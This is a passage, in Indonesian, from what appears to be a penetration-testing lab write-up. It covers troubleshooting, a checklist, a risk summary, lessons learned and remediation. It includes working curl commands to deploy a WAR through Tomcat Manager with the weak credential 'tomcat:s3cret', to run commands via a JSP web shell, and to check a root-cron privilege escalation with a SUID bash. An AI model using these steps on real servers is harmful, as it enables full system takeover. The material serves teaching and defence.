### 16.5 Perbaikan Permanen Setelah Cleanup

Cleanup artefak saja tidak menghilangkan kerentanan. Administrator tetap harus:

```bash
sudo chown root:root /opt/backup/backup.sh
sudo chmod 700 /opt/backup/backup.sh
sudo chown root:root /opt/backup
sudo chmod 750 /opt/backup
```

Credential Tomcat Manager juga harus dirotasi atau akun dinonaktifkan.

---

## 17. Troubleshooting untuk Pemula

### 17.1 Dirsearch Tidak Menemukan `/manager`

Pastikan URL menyertakan scheme dan port:

```bash
dirsearch -u http://192.168.56.117:8081
```

Periksa secara manual:

```bash
curl -i http://192.168.56.117:8081/manager/
```

---

### 17.2 Credential Menghasilkan `401 Unauthorized`

Kemungkinan:

- username atau password salah;
- akun dinonaktifkan;
- credential telah dirotasi;
- request menuju endpoint yang berbeda;
- header Authorization tidak terkirim.

Gunakan mode verbose:

```bash
curl -v \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

---

### 17.3 Mendapatkan `403 Forbidden` pada `/manager/text`

Credential mungkin valid, tetapi akun tidak memiliki role:

```text
manager-script
```

Akun dengan hanya `manager-gui` dapat mengakses antarmuka browser tetapi tidak selalu dapat menggunakan text API.

---

### 17.4 Deployment WAR Gagal

Periksa response lengkap:

```bash
curl -i \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
```

Kemungkinan:

- role akun tidak cukup;
- context path sudah digunakan;
- file WAR rusak;
- ukuran upload dibatasi;
- Tomcat tidak dapat menulis ke direktori deployment;
- aplikasi gagal start.

---

### 17.5 `/labcmd/cmd.jsp` Menghasilkan `404`

Periksa daftar aplikasi:

```bash
curl -s \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

Periksa isi archive:

```bash
unzip -l labcmd.war
```

Pastikan nama dan path file tepat:

```text
cmd.jsp
```

---

### 17.6 Command dengan Spasi atau Karakter Khusus Gagal

Hindari menyusun query URL secara manual.

Gunakan:

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; whoami; hostname" \
  "$BASE_URL"
```

---

### 17.7 Tidak Menemukan `/tmp/root_proof`

Periksa beberapa hal:

```bash
curl -sG \
  --data-urlencode \
  "cmd=tail -n 10 /opt/backup/backup.sh; echo; ps aux | grep -E '[c]ron|[c]rond'; echo; ls -l /etc/cron.d/backup" \
  "$BASE_URL"
```

Kemungkinan:

- cron belum menjalankan siklus berikutnya;
- service cron tidak aktif;
- file cron tidak terbaca;
- script memiliki syntax error;
- line ending script tidak sesuai;
- filesystem read-only.

---

### 17.8 `test -w` Menampilkan `NOT_WRITABLE`

Periksa identitas dan group:

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; groups; stat -c '%A %a %U %G %n' /opt/backup/backup.sh" \
  "$BASE_URL"
```

Kemungkinan permission telah diperbaiki atau proses Tomcat tidak termasuk group yang diharapkan.

---

### 17.9 `/tmp/rootbash -p` Tidak Menghasilkan `euid=0`

Periksa:

```bash
curl -sG \
  --data-urlencode \
  "cmd=stat -c '%A %a %U %G %n' /tmp/rootbash; findmnt -no TARGET,OPTIONS /tmp 2>/dev/null" \
  "$BASE_URL"
```

Kemungkinan:

- owner bukan root;
- mode bukan `4755`;
- `/tmp` menggunakan `nosuid`;
- security hardening menolak SUID;
- Bash dijalankan tanpa `-p`.

---

## 18. Checklist Pengujian

### Reconnaissance

- [x] Memastikan target dapat dijangkau
- [x] Menemukan `/manager`
- [x] Memvalidasi HTTP Basic Authentication
- [x] Mengidentifikasi endpoint text interface

### Credential dan Initial Access

- [x] Menguji petunjuk credential dari scanner
- [x] Memvalidasi `/manager/text/list`
- [x] Mengambil informasi server
- [x] Membuat JSP command runner
- [x] Membuat dan deploy WAR
- [x] Memvalidasi RCE sebagai `tomcat`

### Local Enumeration

- [x] Memeriksa user dan group
- [x] Memeriksa hostname dan OS
- [x] Memeriksa indikasi container
- [x] Mengidentifikasi cron job custom
- [x] Memeriksa permission script

### Privilege Escalation

- [x] Membuktikan script writable
- [x] Membuat backup script
- [x] Menambahkan proof command minimal
- [x] Memvalidasi file milik root
- [x] Memvalidasi `uid=0(root)`
- [x] Mendemonstrasikan `euid=0(root)` pada lab

### Cleanup

- [ ] Mengembalikan isi script backup
- [ ] Menghapus `/tmp/root_proof`
- [ ] Menghapus `/tmp/rootbash`
- [ ] Menghapus backup sementara
- [ ] Undeploy `/labcmd`
- [ ] Menghapus artefak lokal
- [ ] Merotasi credential Tomcat
- [ ] Memperbaiki owner dan permission script

---

## 19. Ringkasan Risiko

| Temuan | Dampak | Severity |
|---|---|---|
| Tomcat Manager terekspos | Attack surface administrasi dapat dijangkau | High |
| Credential manajemen lemah | Akses tidak sah ke fungsi administrasi | Critical |
| Hak deployment WAR | Remote Command Execution sebagai user Tomcat | Critical |
| Root cron script writable | Privilege escalation menjadi root | Critical |

Temuan-temuan tersebut tidak berdiri sendiri. Kombinasinya membentuk attack chain dari akses jaringan menjadi pengambilalihan penuh server.

---

## 20. Pelajaran Utama

1. Hasil scanner harus selalu divalidasi secara manual.
2. Antarmuka manajemen tidak boleh terekspos ke jaringan yang tidak tepercaya.
3. Credential administrasi harus kuat, unik, dan dimonitor.
4. Role `manager-script` memiliki risiko tinggi karena dapat digunakan untuk deployment.
5. RCE sebagai service account belum tentu akhir pengujian; lakukan enumerasi lokal secara sistematis.
6. File cron dapat aman, tetapi script atau dependency yang dipanggilnya tetap harus diperiksa.
7. Root tidak boleh menjalankan file yang writable oleh user atau group berprivilege rendah.
8. Proof minimal lebih tepat untuk asesmen produksi daripada langsung membuat root shell.
9. Permission direktori induk sama pentingnya dengan permission file.
10. Cleanup dan pemulihan konfigurasi merupakan bagian dari proses pengujian.

---

## 21. Kesimpulan

Lab Catalina berhasil dikompromikan melalui kombinasi kelemahan pada lapisan aplikasi dan sistem operasi.

Akses awal diperoleh karena Tomcat Manager dapat dijangkau dan menerima credential lemah `tomcat:s3cret`. Akun tersebut memiliki akses ke text interface dan dapat melakukan deployment file WAR. WAR berisi JSP command runner kemudian memberikan remote command execution sebagai user `tomcat`.

Enumerasi lokal menemukan cron job yang menjalankan `/opt/backup/backup.sh` sebagai `root` setiap menit. Walaupun file cron dimiliki root, script yang dipanggil memiliki mode `775`, owner `root`, dan group `tomcat`. Akibatnya, user `tomcat` dapat mengubah script tersebut.

Command pembuktian yang ditambahkan ke script dijalankan oleh cron sebagai `root`, menghasilkan file `/tmp/root_proof` dengan isi `uid=0(root)`. Dalam demonstrasi lanjutan di laboratorium, cron juga dapat membuat SUID Bash yang menghasilkan `euid=0(root)`.

Ringkasan akhir:

```text
Initial Access : Weak Tomcat Manager credential
Execution      : WAR deployment dan JSP command runner
User awal      : tomcat
Privesc        : Writable script executed by root cron
User akhir     : root
Severity       : Critical
```

Perbaikan harus memutus seluruh attack chain, bukan hanya satu bagian. Tomcat Manager perlu dibatasi, credential harus dirotasi, role harus dipersempit, aplikasi tidak sah harus dihapus, dan seluruh script yang dijalankan root harus dimiliki serta hanya dapat ditulis oleh root.
